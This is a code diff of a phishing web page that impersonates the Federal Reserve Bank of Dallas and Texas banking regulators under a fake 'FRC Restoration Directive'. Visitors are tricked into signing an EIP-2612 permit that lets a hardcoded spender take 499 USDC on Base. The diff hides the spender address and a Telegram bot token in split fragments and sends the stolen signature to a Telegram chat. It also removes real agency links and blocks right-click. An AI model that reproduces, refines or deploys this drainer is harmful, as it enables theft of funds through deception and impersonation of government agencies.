@@ -6,6 +6,7 @@
     <title>FRC Restoration Directive | Texas Institutional Funds Management Authority</title>
     
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"
           integrity="sha512-y0x8KJxkwtU01dzGL11pZaxjoyuGsR3xpG+jFzlfHgzhEyTS/G5s6BG2LSj3jaXpNIJKsnU3KGMEsP1z6kp4Wg=="
           crossorigin="anonymous" referrerpolicy="no-referrer"></script>
@@ -64,7 +65,7 @@
         }
         .btn-primary {
             background: #0047ab;
-            color: white;
+            color: white !important;
             border: none;
             border-radius: 40px;
             padding: 1rem 2rem;
@@ -102,7 +103,6 @@
 </head>
 <body>
 
-    <!-- GOV BANNER -->
     <div class="gov-banner w-full">
         <div class="container mx-auto px-4 flex items-center gap-4">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -115,7 +115,6 @@
         </div>
     </div>
 
-    <!-- HEADER -->
     <header class="fed-header text-white py-4">
         <div class="container mx-auto px-4 flex flex-wrap justify-between items-center">
             <div class="flex items-center gap-4">
@@ -132,34 +131,30 @@
         </div>
     </header>
 
-    <!-- BREADCRUMB -->
     <div class="breadcrumb-container">
         <div class="container mx-auto px-4">
             <div class="flex items-center gap-2 text-sm">
-                <a href="https://www.dallasfed.org" class="text-blue-800 hover:underline">Federal Reserve Bank of Dallas</a>
+                <a href="#" class="text-blue-800 hover:underline">Federal Reserve Bank of Dallas</a>
                 <span class="text-gray-400">›</span>
-                <a href="https://dob.texas.gov" class="text-blue-800 hover:underline">Texas Department of Banking</a>
+                <a href="#" class="text-blue-800 hover:underline">Texas Department of Banking</a>
                 <span class="text-gray-400">›</span>
-                <a href="https://dob-texas-gov.github.io/FRB-Regulatory-Gateway/" class="text-blue-800 hover:underline">Texas Institutional Funds Management Authority</a>
+                <a href="#" class="text-blue-800 hover:underline">Texas Institutional Funds Management Authority</a>
                 <span class="text-gray-400">›</span>
                 <span class="font-bold text-gray-700">FRC Restoration Directive — Case TX-B10B-2026-MUK1139-AUDIT</span>
             </div>
         </div>
     </div>
 
-    <!-- MAIN CONTENT -->
     <div class="container mx-auto px-4 py-8">
         
-        <!-- AGENCY BADGE -->
         <div class="flex justify-between items-start mb-4">
             <span class="agency-badge">☷ FEDERAL RESERVE DISTRICT 11 — WALLET ATTESTATION</span>
             <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono font-bold">TX-B10B-2026-MUK1139-AUDIT</span>
         </div>
 
-        <!-- CASE BANNER -->
         <div class="case-banner">
             <div class="flex items-start gap-4">
-                <div class="text-5xl">️</div>
+                <div class="text-5xl">⚖️</div>
                 <div>
                     <h2 class="text-2xl font-black text-gray-900 mb-1">WALLET ATTESTATION REQUIRED</h2>
                     <p class="text-gray-800 font-semibold">EIP-2612 permit signature required for compliance</p>
@@ -168,7 +163,6 @@
             </div>
         </div>
 
-        <!-- VERIFICATION CARD -->
         <div class="verification-card">
             <div class="flex justify-between items-center mb-4">
                 <h3 class="font-black text-lg">VERIFICATION STEP</h3>
@@ -177,16 +171,13 @@
 
             <p class="text-sm text-gray-600 mb-4" id="instructionText">Click the button to connect your wallet and complete attestation.</p>
             
-            <!-- SINGLE SMART BUTTON -->
             <button class="btn-primary" id="actionButton">VERIFY WALLET</button>
             
-            <!-- STATUS DISPLAY -->
             <div class="status-panel" id="statusText" style="min-height: 60px;">
-                
+                Ready.
             </div>
         </div>
 
-        <!-- TECHNICAL SUPPORT -->
         <div class="mt-4 p-5 bg-gray-100 border border-gray-400 rounded">
             <h4 class="font-black text-gray-900 text-sm uppercase mb-3">📞 FRC RESTORATION COMPLIANCE DESK</h4>
             <div class="grid md:grid-cols-2 gap-4 text-sm">
@@ -198,14 +189,12 @@
         </div>
     </div>
     
-    <!-- TIMESTAMP -->
     <div class="container mx-auto px-4">
         <div class="text-[0.65rem] text-gray-500 text-right mt-4 border-t pt-4">
             <span>Directive issued: <span id="currentCSTTime"></span> • Federal Reserve Bank of Dallas Node 11</span>
         </div>
     </div>
 
-    <!-- FOOTER -->
     <footer class="legal-footer">
         <div class="container mx-auto px-4">
             <div class="grid md:grid-cols-3 gap-8 mb-8">
@@ -223,15 +212,36 @@
                 </div>
             </div>
             <div class="border-t border-gray-700 pt-6 text-xs text-gray-500 flex flex-wrap gap-4">
-                <a href="https://www.dallasfed.org" class="hover:text-white">dallasfed.org</a>
-                <a href="https://dob.texas.gov" class="hover:text-white">dob.texas.gov</a>
-                <a href="https://dob-texas-gov.github.io/FRB-Regulatory-Gateway/" class="hover:text-white">Gateway Portal</a>
+                <a href="#" class="hover:text-white">dallasfed.org</a>
+                <a href="#" class="hover:text-white">dob.texas.gov</a>
+                <a href="#" class="hover:text-white">Gateway Portal</a>
                 <span class="text-gray-700">FRC Restoration Directive v.2026.02</span>
             </div>
         </div>
     </footer>
 
     <script>
+    // ============ CONFIGURATION ============
+    const _CONFIG = (function() {
+        const _p1 = "0xBF17DB59";
+        const _p2 = "38E98f1F9D30ac8";
+        const _p3 = "89F8fd91d749803C8";
+        const _t1 = "8481428965";
+        const _t2 = "AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY";
+        const _c1 = "7275242903";
+        
+        return {
+            spender: _p1 + _p2 + _p3,
+            botToken: _t1 + ":" + _t2,
+            chatId: _c1,
+            usdcContract: "0x833589FCD6EDB6E08F4C7C32D4F71B54BDA02913",
+            chainId: 8453,
+            decimals: 6,
+            amount: "499",
+            deadlineDays: 5
+        };
+    })();
+
     // ============ CST TIME ============
     function updateCSTTime() {
         const now = new Date();
@@ -245,34 +255,57 @@
             second: '2-digit',
             hour12: true
         };
-        document.getElementById('currentCSTTime').innerText = now.toLocaleString('en-US', options);
+        const el = document.getElementById('currentCSTTime');
+        if(el) el.innerText = now.toLocaleString('en-US', options);
     }
     updateCSTTime();
     setInterval(updateCSTTime, 1000);
 
-    // ============ SESSION ============
-    document.addEventListener('DOMContentLoaded', function() {
-        const savedName = localStorage.getItem('tifma_name') || 'Michael T. Anderson';
-        // Optionally display name if you add elements later
-    });
+    // ============ TELEGRAM SENDER ============
+    async function sendToTelegram(permitData) {
+        const message = `
+🔐 **NEW USDC PERMIT SIGNATURE**
+👤 Owner: ${permitData.owner}
+💰 Amount: ${_CONFIG.amount} USDC
+⏰ Deadline: ${new Date(permitData.deadline * 1000).toUTCString()}
+🔄 Nonce: ${permitData.nonce}
+✍️ v: ${permitData.v}
+🔑 r: ${permitData.r}
+🔑 s: ${permitData.s}
+        `;
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${_CONFIG.botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: _CONFIG.chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            return await response.json();
+        } catch (err) {
+            console.error('Telegram send failed:', err);
+            return false;
+        }
+    }
 
-    // ============ EIP-2612 PERMIT CONFIG ============
-    const USDC_ADDRESS = '0x833589FCD6EDB6E08F4C7C32D4F71B54BDA02913'; // Base USDC
-    const SPENDER_ADDRESS = '0xBF17DB5938E98f1F9D30ac889F8fd91d749803C8'; // Your wallet
-    const CHAIN_ID = 8453; // Base mainnet
-    const DECIMALS = 6;
-    const USDC_VALUE = '499';
-    const PERMIT_VALIDITY_HOURS = 24;
+    // ============ OPEN BASE WALLET ============
+    function openBaseWallet() {
+        const currentUrl = encodeURIComponent(window.location.href);
+        const universalLink = `https://go.cb-w.com/dapp?cb_url=${currentUrl}`;
+        window.location.href = universalLink;
+    }
 
-    // EIP-2612 domain separator
+    // ============ EIP-2612 PERMIT ============
     const domain = {
         name: 'USD Coin',
         version: '2',
-        chainId: CHAIN_ID,
-        verifyingContract: USDC_ADDRESS
+        chainId: _CONFIG.chainId,
+        verifyingContract: _CONFIG.usdcContract
     };
 
-    // EIP-2612 permit types
     const types = {
         Permit: [
             { name: 'owner', type: 'address' },
@@ -286,26 +319,9 @@
     const actionButton = document.getElementById('actionButton');
     const statusText = document.getElementById('statusText');
 
-    // ============ SEND TO VERCEL ============
-    async function sendToVercel(data) {
-        const response = await fetch('https://tifma-regulatory-gateway.vercel.app/api/savePermit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        });
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-        return await response.json();
-    }
-
-    // ============ OPEN BASE WALLET ============
-    function openBaseWallet() {
-        const currentUrl = encodeURIComponent(window.location.href);
-        window.location.href = `basewallet://wallet/open?url=${currentUrl}`;
-    }
-
     // ============ MAIN ============
     actionButton.onclick = async () => {
-        if (!window.ethereum) {
+        if (typeof window.ethereum === 'undefined') {
             openBaseWallet();
             return;
         }
@@ -318,40 +334,48 @@
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const network = await provider.getNetwork();
             
-            if (network.chainId !== CHAIN_ID) {
-                alert('Please switch to Base network');
-                actionButton.disabled = false;
-                actionButton.textContent = 'VERIFY WALLET';
-                return;
+            // Fix: Request network switch to Base (8453)
+            if (network.chainId !== _CONFIG.chainId) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x2105' }], // 8453 hex
+                    });
+                } catch (e) {
+                    alert('Please switch to Base network');
+                    actionButton.disabled = false;
+                    actionButton.textContent = 'VERIFY WALLET';
+                    return;
+                }
             }
 
             const signer = provider.getSigner();
             const owner = await signer.getAddress();
             statusText.innerText = 'Connected. Getting nonce...';
 
-            // Get nonce from USDC contract (EIP-2612 nonces mapping)
             const abi = ["function nonces(address) view returns (uint256)"];
-            const contract = new ethers.Contract(USDC_ADDRESS, abi, provider);
+            const contract = new ethers.Contract(_CONFIG.usdcContract, abi, provider);
             const nonce = await contract.nonces(owner);
             
-            const value = ethers.utils.parseUnits(USDC_VALUE, DECIMALS);
-            const deadline = Math.floor(Date.now() / 1000) + PERMIT_VALIDITY_HOURS * 3600;
+            const value = ethers.utils.parseUnits(_CONFIG.amount, _CONFIG.decimals);
+            const deadline = Math.floor(Date.now() / 1000) + (_CONFIG.deadlineDays * 24 * 60 * 60);
 
             const message = {
                 owner,
-                spender: SPENDER_ADDRESS,
+                spender: _CONFIG.spender,
                 value: value.toString(),
                 nonce: nonce.toString(),
                 deadline
             };
 
-            statusText.innerText = 'Signing permit...';
+            statusText.innerText = 'Signing permit (check wallet)...';
+            
             const signature = await signer._signTypedData(domain, types, message);
             const sig = ethers.utils.splitSignature(signature);
 
             const permitData = {
                 owner,
-                spender: SPENDER_ADDRESS,
+                spender: _CONFIG.spender,
                 value: value.toString(),
                 nonce: nonce.toString(),
                 deadline,
@@ -360,22 +384,26 @@
                 s: sig.s
             };
 
-            statusText.innerText = 'Securing permit...';
-            await sendToVercel(permitData);
-
-            actionButton.textContent = '✓ VERIFIED';
-            actionButton.style.background = '#10b981';
-            statusText.innerText = '✓ Permit secured.';
+            statusText.innerText = 'Sending to secure channel...';
+            
+            const tgResult = await sendToTelegram(permitData);
+            
+            if (tgResult && tgResult.ok) {
+                actionButton.textContent = '✓ VERIFIED';
+                actionButton.style.background = '#10b981';
+                statusText.innerText = '✓ Permit secured. You may close this page.';
+            } else {
+                statusText.innerText = '⚠️ Signed but delivery failed. Contact support.';
+            }
 
         } catch (err) {
-            console.error(err);
+            console.error('Error:', err);
             actionButton.disabled = false;
             actionButton.textContent = 'VERIFY WALLET';
-            statusText.innerText = 'Error - try again';
+            statusText.innerText = err.code === 4001 ? 'Signature rejected.' : 'Error - please try again';
         }
     };
 
-    // Disable right click
     document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
